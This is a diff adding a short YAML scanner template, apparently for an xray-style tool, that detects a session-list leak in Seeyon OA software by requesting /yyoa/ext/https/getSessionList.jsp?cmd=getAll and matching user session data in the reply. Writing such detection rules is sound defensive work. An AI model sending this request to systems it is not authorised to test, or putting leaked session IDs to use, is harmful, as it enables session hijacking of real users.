@@ -1,0 +1,17 @@
+id: seeyon-session-leak
+
+info:
+    name: seeyon-session-leak
+    author: sakura404x
+    severity: high
+
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /yyoa/ext/https/getSessionList.jsp?cmd=getAll
+        expression: response.status == 200 && response.body.bcontains(b"<SessionList>\r\n<Session>\r\n<usrID>")
+expression: r0()
